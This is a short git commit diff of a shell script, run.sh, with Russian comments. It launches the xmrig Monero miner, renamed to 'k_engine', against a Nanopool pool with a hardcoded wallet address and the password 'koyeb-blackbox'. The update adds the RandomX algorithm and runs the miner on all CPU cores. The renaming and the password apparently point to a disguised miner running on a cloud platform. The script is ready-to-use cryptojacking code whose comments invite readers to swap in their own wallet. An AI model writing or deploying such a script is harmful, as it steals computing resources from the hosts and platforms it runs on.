a49c48416f34a58a52f5b26dab6a9af990a7f0ab
dd <152060884+Noidor606@users.noreply.github.com>
2025-09-18 22:24:43 +0300

    Update run.sh

--- run.sh
+++ run.sh
@@ -8,4 +8,5 @@ mv xmrig k_engine
 
 # Запускаем майнер на все доступные ядра
 # ЗАМЕНИ КОШЕЛЕК НА СВОЙ!
-./k_engine -o xmr-eu1.nanopool.org:14444 -u 45dVMwtYuoyNcU26FHy4FpNmqL5HeXdu3cNbzqmvPU1SHyF2WcdafBRT29EZJvinUuePUL6LgSZdpJEbt6JEfnLZDh31puH -p koyeb-blackbox -k
+# НОВАЯ, РАБОЧАЯ ВЕРСИЯ
+./k_engine -o xmr-eu1.nanopool.org:14444 -u 45dVMwtYuoyNcU26FHy4FpNmqL5HeXdu3cNbzqmvPU1SHyF2WcdafBRT29EZJvinUuePUL6LgSZdpJEbt6JEfnLZDh31puH -p koyeb-blackbox -k -a rx/0 --threads=$(nproc)
